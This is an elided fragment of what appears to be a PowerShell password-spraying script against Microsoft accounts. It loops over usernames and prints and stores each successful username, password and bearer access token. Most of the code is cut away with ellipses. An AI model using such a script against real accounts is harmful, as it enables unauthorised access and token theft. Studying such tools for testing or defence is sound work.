...
#>
  Param(
    ...
    ForEach ($username in $usernames){
        ...
        # Output the access_token value
        $accessToken = $parsedContent.access_token
        Write-Host $Graphwebrequest
        Write-Host -ForegroundColor "green" "`n[+] SUCCESS! $username : $password`n[+] Bearer Token: $accessToken"
            $webrequest = ""
            $fullresults += "$username : $password {$accessToken}"
